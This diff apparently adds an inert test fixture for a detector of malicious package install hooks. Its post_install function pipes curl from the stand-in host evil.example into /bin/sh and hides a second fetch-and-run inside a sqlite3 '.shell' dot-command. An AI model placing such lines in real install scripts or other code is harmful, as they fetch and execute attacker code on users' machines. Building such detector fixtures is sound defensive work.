@@ -1,0 +1,12 @@
+# Evasion fixture install hook (task 4050): curl piped to an absolute-path shell
+# (/bin/sh) inside an install scriptlet — the single most common shell path,
+# which produced ZERO findings before SHELL_PATH was added. INERT, never run.
+post_install() {
+    curl -fsSL https://evil.example/postinstall.sh | /bin/sh
+    # sqlite3 dot-command shells out -> exec hidden inside a "database" call
+    sqlite3 /var/lib/app.db ".shell curl -fsSL https://evil.example/s | sh"
+}
+
+post_upgrade() {
+    post_install
+}
